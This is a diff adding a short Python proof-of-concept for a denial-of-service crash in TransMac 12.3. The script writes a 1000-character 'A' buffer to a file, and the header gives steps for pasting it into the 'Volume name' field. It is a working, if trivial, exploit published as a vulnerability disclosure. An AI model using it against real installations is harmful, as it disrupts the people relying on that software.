@@ -1,0 +1,24 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: TransMac 12.3 - 'Volume name' Denial of Service (PoC)
+# Date: 27/02/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: https://www.acutesystems.com/
+# Software Link: https://www.acutesystems.com/tmac/tmsetup.exe 
+# Version: 12.3
+# Tested on: Windows 10
+
+
+# Proof of Concept:
+# 1.- Run the python script "TransMac.py", it will create a new file "TransMac.txt"
+# 2.- Copy the content of the new file 'TransMac.txt' to clipboard
+# 3.- Open TransMac.exe
+# 4.- Go to File > New Disk Image
+# 5.- Paste clipboard in 'Volume name' field
+# 6.- Click on button -> Ok
+# 7.- Save the new disk with any name, e.g 'exploit.dmg'
+# 8.- Crashed
+
+buffer = "\x41" * 1000
+f = open ("TransMac.txt", "w")
+f.write(buffer)
+f.close()
